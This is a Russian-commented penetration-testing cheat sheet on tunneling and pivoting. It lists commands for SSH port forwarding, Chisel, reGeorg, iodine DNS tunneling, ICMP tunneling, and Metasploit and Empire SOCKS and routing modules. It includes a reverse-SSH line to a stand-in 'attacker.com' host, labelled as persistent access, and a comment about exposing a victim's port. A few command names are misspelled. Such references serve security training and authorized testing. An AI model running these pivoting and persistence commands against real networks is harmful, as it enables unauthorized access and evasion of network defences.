```http
https://en.wikipedia.org/wiki/Tunneling_protocol
https://en.wikipedia.org/wiki/Port_forwarding
https://en.wikipedia.org/wiki/Proxy_server
```

# Proxychains
```http
https://github.com/haad/proxychains
```

```bash
proxychains <command> FINALTARGETIP
```
___
# SSH
```http
https://en.wikipedia.org/wiki/Secure_Shell
```

```bash
ssh -L 8080:192.168.1.10:80 user@jump_host  
# Теперь localhost:8080 → 192.168.1.10:80

ssh -R 9000:localhost:4444 user@vps  
# Проброс локального сервиса на удалённый хост
# На VPS:9000 → ваш localhost:4444

ssh -D 9050 user@target  
# SOCKS5-прокси на 127.0.0.1:9050

ssh -fNMS /tmp/ssh_mux user@target
# Фоновая сессия

ssh -S /tmp/ssh_mux user@target
# Подключение через существующую сессию

ssh -fN -R 2222:localhost:22 user@attacker.com
#Reverse SSH (Постоянный доступ)

ssh -J user@jump_host user@target
# Аналог -L/-R в одной команде
```

___
___
### **VPN Tunneling**
```http
https://en.wikipedia.org/wiki/Virtual_private_network
```

```bash
openvpn --config client.ovpn
#OpenVPN

wg-quick up wg0
#WireGuard
```
___
___
# Chisel
```http
https://github.com/jpillora/chisel/
```

```bash
./chisel server -p 8080 --reverse
#Запуск сервера слушает порт 8080 и разрешает клиентам пробрасывать порты

./chisel client SERVER_IP:8080 R:8888:127.0.0.1:80
#Пробрасывает локальный 80 порт жертвы на сервер 8888

./chisel client SERVER_IP:8080 socks
#Динамический порт-Формардинг SOCKS5 

./chisel client SERVER_IP:8080 9000:10.10.10.5:3389
#Доступ к серверу из внутренней сети Local Port Forwarding
```
___
___
# reGeorg
```http
https://github.com/sensepost/reGeorg
```

```bash
python reGeorgSocksProxy.py -p 9050 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
___
___
# Sockat
```http
https://github.com/3ndG4me/socat
```

```bash
./socksat -l 1080 -r 192.168.1.100:1081
# Перенаправление через другой прокси

./socksat -l 443 --ssl
# Запуск через SSL
```
___
___
# Iodine
```http
https://github.com/yarrick/iodine
```

```bash
iodined -f -P password 10.0.0.1 tunnel.example.com
# DNS-туннелирование (iodine)
```
___
___
# ptunnel
```http
https://github.com/utoni/ptunnel-ng
```

```bash
ptunnel -p ping-server.com -lp 1080 -da target.com -dp 22
# ICMP-туннелирование (ptunnel)
```
___
___
# С2
## Metasploit
```bash
# Локальный проброс (Local Port Forwarding)
portfwd add -l 3389 -p 3389 -r 10.0.0.5  # Проброс RDP

# Удалённый проброс (Remote Port Forwarding)
portfwd add -R -l 8080 -p 80 -L 192.168.1.100  # Открытие порта на атакующем

auxiliary/server/socks_proxy
#Ручной проброс через SOCKS

post/multi/manage/autoroute
auxiliary/server/socks_proxy
# Создание SOCKS-прокси


run post/multi/manage/autoroute  
# Автоматическое добавление маршрутов
```
# Empire
```bash
usemule management/socks_proxy
# SOCKS-прокси

usemodule management/auto_routing
# Автомаршрутизация

usemodule management/portfwd
# Проброс портов
```
____
___
___
